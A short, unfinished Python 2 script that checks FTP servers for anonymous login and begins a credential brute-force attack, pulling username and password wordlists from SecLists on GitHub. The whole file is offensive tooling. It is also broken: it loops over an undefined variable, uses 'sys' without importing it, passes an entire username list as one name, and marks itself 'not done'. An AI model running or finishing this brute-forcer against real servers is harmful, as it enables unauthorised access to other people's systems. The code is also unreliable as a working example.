from ftplib import FTP
import socket
import requests

def check_anonymous_login(target):
    try:
        ftp = FTP(target)
    except socket.gaierror:
        print("not a correct servername")
        return 1
    ftp.login()
    print "\n[+] Anonymous login is open."
    print "\n[+] Username : anonymous"
    print "\n[+] Password : anonymous\n"
    ftp.quit()

def ftp_login(target, username, password):
    ftp = FTP(target)
    ftp.login(username, password)
    ftp.quit()
    print "\n[!] Credentials have found."
    print "\n[!] Username : {}".format(username)
    print "\n[!] Password : {}".format(password)
    sys.exit(0)

def brute_force(target):
    username_response = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/cirt-default-usernames.txt")
    username = username_response.text.split('\n')
    passwords_response = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt")
    passwords = passwords_response.text.split('\n')
    
    for word in words:
        # not done
        word = word.strip()
        ftp_login(target, username, word)

